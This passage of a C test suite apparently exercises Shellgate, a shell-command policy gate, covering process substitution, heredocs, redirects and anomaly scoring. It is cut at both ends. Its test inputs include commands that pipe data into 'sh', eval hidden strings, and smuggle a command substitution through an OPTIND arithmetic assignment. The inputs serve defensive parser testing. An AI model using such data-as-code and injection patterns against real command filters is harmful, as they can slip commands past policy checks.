   * retain the same escaped process-substitution spelling as Shellsplit's
   * public canonical renderer. */
  ASSERT_SG_OK(eval_cmd(gate, "cat <(printf \\))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,12:<(printf \\)),");

  ASSERT_SG_OK(eval_cmd(gate, "echo foo$(cat)bar", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,12:foo$(cat)bar,");
  ASSERT(result.has_dynamic_substitution_io);
  ASSERT(result.requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(process_substitution_interpreter_input_contract) {
  static const char *rules[] = {"sh", "cat", "cat *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "sh < <(printf 'echo nested')", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation);

  /* The output form reports dynamic descriptor I/O, not a generic request to
   * inspect shell-word content. Exact routes belong to Shellsplit's graph. */
  ASSERT_SG_OK(eval_cmd(gate, "cat log > >(sh)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         result.subcommands[1].has_dynamic_substitution_io);

  /* The raw redirect token retains this physical continuation, but it still
   * owns the output process-substitution operand after lexical removal. */
  ASSERT_SG_OK(eval_cmd(gate, "cat log >\\\n >(sh)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         result.subcommands[1].has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "cat log 2>> >(sh)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         result.subcommands[1].has_dynamic_substitution_io);

  /* A later output redirect or close supersedes the earlier process
   * substitution. The nested command remains an ordinary evaluated command,
   * but Shellgate must not request inspection for an unfed stale endpoint. */
  ASSERT_SG_OK(eval_cmd(gate, "cat log > >(sh) > /tmp/final.out", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat log > >(sh) 1>&-", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(
      eval_cmd(gate, "{ printf payload; } > >(sh) > /tmp/final.out", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(process_substitution_direction_contract) {
  static const char *rules[] = {"sh", "cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  sg_result_t result;
  static const char *const unrouted[] = {
      "cat < >(sh)",
      "cat > <(printf input)",
      "cat><(printf input)",
  };
  for (uint32_t i = 0; i < sizeof(unrouted) / sizeof(unrouted[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, unrouted[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.subcommand_count == 2 &&
           !result.subcommands[0].requires_substitution_evaluation &&
           !result.subcommands[1].requires_substitution_evaluation);
  }

  /* An explicit read/write redirect with an input process substitution feeds
   * cat's fd 0 from the nested producer, but does not turn that descriptor
   * route into shell-word evaluation. */
  static const char *const routed[] = {
      "cat <> <(printf input)",
  };
  for (uint32_t i = 0; i < sizeof(routed) / sizeof(routed[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, routed[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
           result.subcommands[0].has_dynamic_substitution_io &&
           !result.subcommands[1].requires_substitution_evaluation);
  }

  /* `<> >(consumer)` has the same known write route as `> >(consumer)`: the
   * descriptor remains readable too, but its write side supplies the nested
   * consumer's stdin. The selected descriptor is retained even when it is
   * nonstandard. */
  static const char *const read_write_output[] = {
      "cat <> >(sh)",
      "cat 3<> >(sh)",
  };
  for (uint32_t i = 0;
       i < sizeof(read_write_output) / sizeof(read_write_output[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, read_write_output[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
           !result.subcommands[0].requires_substitution_evaluation &&
           result.subcommands[1].has_dynamic_substitution_io);
  }

  ASSERT_SG_OK(eval_cmd(gate, "cat <> >(sh) 0> /tmp/final.out", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(expansion_phases_survive_failed_setup) {
  static const char *const rules[] = {"true",     "true *",   "false",
                                      "printf *", "export *", "echo *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  config.sensitive_write_path_count = 1;
  bool valid = true;
  for (unsigned anomaly = 0; anomaly < 2; anomaly++) {
    if (anomaly) {
      ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
      ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gate, 32));
    }
    for (unsigned redirect = 0; redirect < 2; redirect++) {
      config.sensitive_write_paths[0] = redirect ? "redirect-out" : "argv-out";
      ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
      for (size_t i = 0; i < sizeof(shellsplit_test_expansion_setup) /
                                 sizeof(shellsplit_test_expansion_setup[0]);
           i++) {
        const shellsplit_test_expansion_setup_case_t *fixture =
            &shellsplit_test_expansion_setup[i];
        /* Repeat the anomaly-enabled evaluation to cover cached results too. */
        for (unsigned repeat = 0; repeat < 1u + anomaly; repeat++) {
          sg_result_t result;
          sg_error_t error = eval_cmd(gate, fixture->source, &result);
          bool inspection = fixture->active && fixture->shell_word;
          bool writes = !redirect && fixture->active && fixture->writer;
          bool expected =
              error == SG_OK && !result.truncated &&
              result.requires_substitution_evaluation == inspection &&
              (!inspection || result.has_dynamic_substitution_io) &&
              (fixture->active || !result.has_dynamic_substitution_io) &&
              ((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
                  writes;
          if (!expected) {
            printf("\n    expansion setup gate: %s (error %d, inspection %d, "
                   "dynamic %d, writes %d, anomaly %u)\n",
                   fixture->source, error,
                   result.requires_substitution_evaluation,
                   result.has_dynamic_substitution_io,
                   (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0,
                   anomaly);
            valid = false;
          }
        }
      }
    }
  }
  sg_gate_free(gate);
  ASSERT(valid);
}

TEST(expansion_control_effects_require_reachable_setup) {
  static const char *const rules[] = {"true", "true *",   "false",   "false *",
                                      "exec", "printf *", "export *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  config.sensitive_write_path_count = 1;
  config.sensitive_write_paths[0] = "out";
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  bool valid = true;
  for (unsigned anomaly = 0; anomaly < 2; anomaly++) {
    if (anomaly) {
      ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
      ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gate, 32));
    }
    for (size_t i = 0; i < sizeof(shellsplit_test_expansion_time_routes) /
                               sizeof(shellsplit_test_expansion_time_routes[0]);
         i++) {
      const shellsplit_test_expansion_time_case_t *fixture =
          &shellsplit_test_expansion_time_routes[i];
      for (unsigned repeat = 0; repeat < 1u + anomaly; repeat++) {
        sg_result_t result;
        sg_error_t error = eval_cmd(gate, fixture->source, &result);
        bool expected = error == SG_OK && !result.truncated &&
                        result.verdict != SG_VERDICT_REJECT &&
                        !result.requires_substitution_evaluation &&
                        !result.has_dynamic_substitution_io;
        bool named_write = false;
        for (uint32_t c = 0; c < result.subcommand_count; c++) {
          const sg_subcommand_result_t *command = &result.subcommands[c];
          named_write |=
              strcmp(command->netargv, "6:printf,7:payload,") == 0 &&
              (command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0;
        }
        expected = expected && named_write == fixture->named_write;
        if (!expected) {
          printf("\n    expansion control gate: %s (error %d, "
                 "named write %d, anomaly %u)\n",
                 fixture->source, error, named_write, anomaly);
          valid = false;
        }
      }
    }
  }
  sg_gate_free(gate);
  ASSERT(valid);
}

TEST(process_pipe_descriptor_policy_contract) {
  static const char *rules[] = {"exec", "true", "cat *", "printf *", "echo *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  static const char *const cases[] = {
      "cat outer <input < >(true </dev/null)",
      "printf value >out &> <(printf ignored >/dev/null)",
      "exec {fd}< >(true </dev/null); cat outer <&$fd",
      "exec {fd}> <(printf ignored >/dev/null); printf value >&$fd",
      "exec {fd}<> <(printf input); printf value >&$fd",
      "exec {fd}<> >(true </dev/null); cat outer <&$fd",
      "exec {fd}<> <(printf input); exec 3>&$fd; exec {fd}>&-; printf value "
      ">&3",
      "exec {fd}> <(printf ignored >/dev/null); echo \"$(printf value >&$fd; "
      "printf suffix)\"",
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i], &result));
    ASSERT(!result.truncated && result.subcommand_count >= 2);
    /* Only the final case embeds shell-word substitution. Pipe-path use and
     * aliasing alone must never request data-as-code inspection. */
    bool shell_word = i + 1 == sizeof(cases) / sizeof(cases[0]);
    ASSERT(result.requires_substitution_evaluation == shell_word);
    ASSERT(result.verdict ==
           (shell_word ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW));
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      ASSERT(result.subcommands[command].matches);
      ASSERT(result.subcommands[command].requires_substitution_evaluation ==
             (shell_word && command == 2));
    }
  }
  sg_gate_free(gate);
}

TEST(process_substitution_operand_syntax_contract) {
  static const char *rules[] = {"echo *", "printf *", "cat"};
  static const char *invalid[] = {
      "echo > (printf value)",  "echo < (printf value)",
      "echo >> (printf value)", "cat << (EOF",
      "{ echo; } > (cat)",
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  for (uint32_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
    sg_result_t result = {0};
    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           !result.requires_substitution_evaluation);
  }
  sg_gate_free(gate);
}

TEST(composite_process_substitution_contract) {
  static const char *rules[] = {"echo *", "cat", "printf *"};
  static const struct {
    const char *input;
    bool shell_word;
  } cases[] = {
      {"cat < prefix<(printf value)", false},
      {"cat > >(printf value)suffix", false},
      {"{ cat; } <> <(printf value)suffix", false},
      {"echo $(<prefix<(printf value))", true},
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].input, &result));
    ASSERT(result.subcommand_count == 2);
    ASSERT(result.verdict == (cases[i].shell_word ? SG_VERDICT_ALLOW_CONDITIONAL
                                                  : SG_VERDICT_ALLOW));
    ASSERT(result.requires_substitution_evaluation == cases[i].shell_word);
    ASSERT(result.has_dynamic_substitution_io == cases[i].shell_word);
  }
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf *", false));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].input, &result));
    ASSERT(result.subcommand_count == 2 && result.verdict == SG_VERDICT_DENY);
  }
  sg_gate_free(gate);
}

TEST(composite_redirect_anomaly_cache_equivalence) {
  static const char *rules[] = {"cat", "echo *", "printf *",
                                "c3",  "cat *",  "mycommand *"};
  static const struct {
    const char *input;
    size_t count;
    bool has_io_only_stage;
  } inputs[] = {
      {"cat < prefix<(printf value);cat;echo end", 4, false},
      {"{ cat; } > >(printf value)suffix;cat;echo end", 4, false},
      {"echo $(<prefix<(printf value));cat;echo end", 4, false},
      {"$'c'3>out;cat \"x\"${y}z;my\\\ncommand value", 3, false},
      {"echo ok; >out; printf one; cat", 3, true},
  };
  sg_gate_t *gates[2] = {
      gate_with_rules(rules, sizeof(rules) / sizeof(rules[0])),
      gate_with_rules(rules, sizeof(rules) / sizeof(rules[0])),
  };
  ASSERT(gates[0] != NULL && gates[1] != NULL);
  for (size_t g = 0; g < 2; g++) {
    ASSERT_SG_OK(sg_gate_set_reject_mask(gates[g], 0));
    ASSERT_SG_OK(sg_gate_enable_anomaly(gates[g], 1000000.0, NULL));
    ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gates[g], g ? 8 : 0));
  }
  shell_netstring_buffer_t raw_sequence = {0};
  shell_netstring_buffer_t type_sequence = {0};
  size_t stage_count = 0;
  ASSERT(shell_build_anomaly_netseqs_buffer(
             "echo ok; >out; printf one; cat",
             strlen("echo ok; >out; printf one; cat"), NULL, &raw_sequence,
             &type_sequence, &stage_count) == SHELL_PROCESS_OK);
  ASSERT(stage_count == 4);
  ASSERT((raw_sequence.length != sizeof("4:echo,0:,6:printf,3:cat,") - 1 ||
          memcmp(raw_sequence.data, "4:echo,0:,6:printf,3:cat,",
                 raw_sequence.length)) == 0);
  ASSERT(
      (type_sequence.length !=
           sizeof("13:4:echo,3:STR,,3:0:,,15:6:printf,3:STR,,6:3:cat,,") - 1 ||
       memcmp(type_sequence.data,
              "13:4:echo,3:STR,,3:0:,,15:6:printf,3:STR,,6:3:cat,,",
              type_sequence.length)) == 0);
  shell_netstring_buffer_free(&type_sequence);
  shell_netstring_buffer_free(&raw_sequence);
  for (size_t round = 0; round < 3; round++)
    for (size_t i = 0; i < sizeof(inputs) / sizeof(inputs[0]); i++) {
      sg_result_t uncached = {0}, cached = {0};
      ASSERT_SG_OK(eval_cmd(gates[0], inputs[i].input, &uncached));
      ASSERT_SG_OK(eval_cmd(gates[1], inputs[i].input, &cached));
      ASSERT(uncached.subcommand_count == inputs[i].count &&
             cached.subcommand_count == inputs[i].count);
      if (inputs[i].has_io_only_stage)
        ASSERT(uncached.verdict == SG_VERDICT_UNDETERMINED &&
               cached.verdict == SG_VERDICT_UNDETERMINED);
      ASSERT(uncached.verdict == cached.verdict &&
             uncached.requires_substitution_evaluation ==
                 cached.requires_substitution_evaluation &&
             uncached.anomaly_score == cached.anomaly_score &&
             uncached.anomaly_score_raw == cached.anomaly_score_raw &&
             uncached.anomaly_score_type == cached.anomaly_score_type &&
             uncached.anomaly_detected == cached.anomaly_detected);
    }
  sg_gate_free(gates[0]);
  sg_gate_free(gates[1]);
}

TEST(compound_word_policy_netargv_contract) {
  static const char *rules[] = {"c3", "cat *", "mycommand *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  static const char command[] = "$'c'3>out;cat \"x\"${y}z;my\\\ncommand value";
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "2:c3,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,6:x${y}z,");
  ASSERT_STR(result.subcommands[2].netargv, "9:mycommand,5:value,");
  ASSERT(result.verdict != SG_VERDICT_REJECT &&
         result.verdict != SG_VERDICT_DENY);
  sg_gate_free(gate);
}

TEST(empty_process_word_policy_contract) {
  static const char *rules[] = {"printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(
      eval_cmd(gate, "<() printf a<()b <()>() ''<() \"<()\"", &result));
  ASSERT(result.subcommand_count == 1 && !result.truncated);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,2:ab,0:,3:<(),");
  ASSERT(result.verdict != SG_VERDICT_DENY &&
         result.verdict != SG_VERDICT_REJECT);
  static const char *const rejected[] = {
      "<() eval 'printf hidden'",
      "<()eval 'printf hidden'",
      "command <() eval 'printf hidden'",
      "<() read -e value",
      "export OPT<()IND='x[$(printf ARITH >&2)0]'",
      "declare RAN<()DOM=1",
      "readonly v<()=text",
      "export POSIX<()LY_CORRECT=x"};
  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
    result = (sg_result_t){0};
    ASSERT(eval_cmd(gate, rejected[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT);
  }
  sg_gate_free(gate);
}

TEST(command_position_group_syntax_contract) {
  static const char *const invalid[] = {
      "foo; {",  "foo; }",  "foo && {",      "foo && }",   "foo | {",
      "foo | }", "foo | )", "echo { foo; }", "echo (foo)", "echo ((1))",
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
    sg_result_t result = {0};
    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           !result.requires_substitution_evaluation);
  }
  sg_gate_free(gate);
}

static bool make_nested_heredoc_substitution(char *command, size_t capacity,
                                             bool process_substitution) {
  int written = snprintf(command, capacity,
                         process_substitution ? "cat <(cat" : "echo $(cat");
  if (written < 0 || (size_t)written >= capacity)
    return false;
  size_t used = (size_t)written;
  for (uint32_t i = 0; i < 9; i++) {
    written = snprintf(command + used, capacity - used, " <<H%u", i);
    if (written < 0 || (size_t)written >= capacity - used)
      return false;
    used += (size_t)written;
  }
  written = snprintf(command + used, capacity - used, "\n");
  if (written < 0 || (size_t)written >= capacity - used)
    return false;
  used += (size_t)written;
  for (uint32_t i = 0; i < 9; i++) {
    written = snprintf(command + used, capacity - used, "body%u\nH%u\n", i, i);
    if (written < 0 || (size_t)written >= capacity - used)
      return false;
    used += (size_t)written;
  }
  written = snprintf(command + used, capacity - used, ")");
  return written >= 0 && (size_t)written < capacity - used;
}

TEST(substitution_comment_and_heredoc_capacity_contract) {
  static const char *rules[] = {"echo *", "printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const char *const invalid[] = {
      "echo $(printf value # )",
      "cat <(printf value # )",
  };
  for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++) {
    sg_result_t result = {0};
    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           !result.requires_substitution_evaluation);
  }

  sg_result_t result = {0};
  ASSERT_SG_OK(
      eval_cmd(gate, "echo $(printf value # )\nprintf done)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count >= 2);

  for (int process_substitution = 0; process_substitution <= 1;
       process_substitution++) {
    char command[512];
    ASSERT(make_nested_heredoc_substitution(command, sizeof(command),
                                            process_substitution != 0));
    memset(&result, 0, sizeof(result));
    ASSERT(eval_cmd(gate, command, &result) == SG_ERR_TRUNC);
    ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
           result.verdict != SG_VERDICT_ALLOW &&
           result.verdict != SG_VERDICT_ALLOW_CONDITIONAL);
  }
  sg_gate_free(gate);
}

TEST(compound_heredoc_substitution_cross_product_contract) {
  static const char *rules[] = {"cat",      "cat #path", "echo *", "id",
                                "printf *", "./clock",   "sleep *"};
  static const struct {
    const char *command;
    uint32_t subcommand_count;
    uint32_t dynamic_consumers;
  } cases[] = {
      {"cat <<EOF\n$(</tmp/mixed-file)$(id)$(printf one; printf two)\nEOF", 4,
       1},
      {"cat <<EOF\n$(cat < <(printf config))\nEOF", 3, 2},
      {"cat <<EOF\n$(printf value 2> >(cat))\nEOF", 3, 2},
      {"cat <<EOF\n$( { printf payload; } | ./clock < <(printf config) )\nEOF",
       4, 2},
      {"{ cat <&4; } 3<<EOF 4<&3 3>&-\n$(id)\nEOF", 2, 1},
      {"cat <<A <<B <<C <<D <<E <<F <<G <<H\n"
       "one\nA\ntwo\nB\nthree\nC\nfour\nD\nfive\nE\nsix\nF\n"
       "seven\nG\n$(id)\nH\n",
       2, 1},
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  for (size_t ci = 0; ci < sizeof(cases) / sizeof(cases[0]); ci++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[ci].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == cases[ci].subcommand_count);
    uint32_t dynamic_consumers = 0;
    for (uint32_t i = 0; i < result.subcommand_count; i++) {
      dynamic_consumers += result.subcommands[i].has_dynamic_substitution_io;
    }
    ASSERT(dynamic_consumers == cases[ci].dynamic_consumers);
  }

  /* Heredoc expansion precedes the later failing duplication, so `id` still
   * executes and its dynamic document route remains visible. The group body
   * never runs, however, so neither command inherits that route as a dynamic
   * consumer. */
  sg_result_t invalid_group_result;
  ASSERT_SG_OK(eval_cmd(gate, "{ cat <&4; } 3<<EOF 3>&- 4<&3\n$(id)\nEOF",
                        &invalid_group_result));
  ASSERT(invalid_group_result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         invalid_group_result.requires_substitution_evaluation &&
         invalid_group_result.has_dynamic_substitution_io &&
         invalid_group_result.subcommand_count == 2);
  for (uint32_t i = 0; i < invalid_group_result.subcommand_count; i++)
    ASSERT(
        !invalid_group_result.subcommands[i].has_dynamic_substitution_io &&
        !invalid_group_result.subcommands[i].requires_substitution_evaluation);

  static const char overflow[] =
      "cat <<A <<B <<C <<D <<E <<F <<G <<H <<I\n"
      "one\nA\ntwo\nB\nthree\nC\nfour\nD\nfive\nE\nsix\nF\n"
      "seven\nG\neight\nH\n$(id)\nI\n";
  sg_result_t result;
  ASSERT(eval_cmd(gate, overflow, &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.verdict != SG_VERDICT_ALLOW &&
         result.verdict != SG_VERDICT_ALLOW_CONDITIONAL);
  sg_gate_free(gate);
}

TEST(compound_brace_substitution_boundary_contract) {
  static const char *rules[] = {"echo *", "id", "cat", "printf *", "sort"};
  static const struct {
    const char *command;
    uint32_t command_count;
    uint32_t dynamic_consumers;
  } dynamic_cases[] = {
      {"{ echo $(id); } | cat", 3, 1},
      {"cat <<EOF\n$( { cat < <(printf config); } )\nEOF", 3, 2},
      {"cat <<EOF\n$( { printf value 3> >(cat); } )\nEOF", 3, 2},
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  for (size_t ci = 0; ci < sizeof(dynamic_cases) / sizeof(dynamic_cases[0]);
       ci++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, dynamic_cases[ci].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == dynamic_cases[ci].command_count);
    uint32_t consumers = 0;
    for (uint32_t i = 0; i < result.subcommand_count; i++) {
      consumers += result.subcommands[i].has_dynamic_substitution_io;
    }
    ASSERT(consumers == dynamic_cases[ci].dynamic_consumers);
  }

  sg_result_t literal;
  ASSERT_SG_OK(eval_cmd(gate, "{ cat <<'EOF'\n$( { id; } )\nEOF\n}", &literal));
  ASSERT(literal.verdict == SG_VERDICT_ALLOW);
  ASSERT(!literal.requires_substitution_evaluation);
  ASSERT(literal.subcommand_count == 1);
  ASSERT(!literal.subcommands[0].requires_substitution_evaluation);
  sg_gate_free(gate);
}

TEST(anomaly_group_heredoc_substitution_contract) {
  static const char command[] =
      "cat <<EOF\n$( { printf one; printf two; } )\nEOF";
  sg_gate_t *gate = gate_with_rules((const char *[]){"cat", "printf *"}, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));

  sg_result_t result;
  for (size_t pass = 0; pass < 6; pass++) {
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == 3);
    ASSERT(result.subcommands[0].requires_substitution_evaluation);
    ASSERT(!result.subcommands[1].requires_substitution_evaluation);
    ASSERT(!result.subcommands[2].requires_substitution_evaluation);
    /* All three executable stages now reach the anomaly model. The first
     * observation necessarily has an unknown-model score; deferred learning
     * makes subsequent equivalent observations score normally. */
    if (pass == 0) {
      ASSERT(isinf(result.anomaly_score));
      ASSERT(isinf(result.anomaly_score_raw));
      ASSERT(isinf(result.anomaly_score_type));
    } else {
      ASSERT(isfinite(result.anomaly_score));
      ASSERT(isfinite(result.anomaly_score_raw));
      ASSERT(isfinite(result.anomaly_score_type));
    }
  }

  size_t vocabulary = test_anomaly_vocabulary(gate);
  ASSERT(vocabulary > 0);
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(gate, true));
  sg_result_t first;
  sg_result_t second;
  ASSERT_SG_OK(eval_cmd(gate, command, &first));
  ASSERT_SG_OK(eval_cmd(gate, command, &second));
  ASSERT(isfinite(first.anomaly_score) &&
         first.anomaly_score == second.anomaly_score);
  ASSERT(first.anomaly_score_raw == second.anomaly_score_raw);
  ASSERT(first.anomaly_score_type == second.anomaly_score_type);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), vocabulary);
  sg_gate_free(gate);
}

TEST(anomaly_large_quoted_delimiter_workspace) {
  char command[4096];
  char nested[4200];
  size_t at = 0, delimiter_length = 1024;
  memcpy(command + at, "cat <<'", 7);
  at += 7;
  memset(command + at, 'E', delimiter_length);
  at += delimiter_length;
  memcpy(command + at, "'\npayload\n", 10);
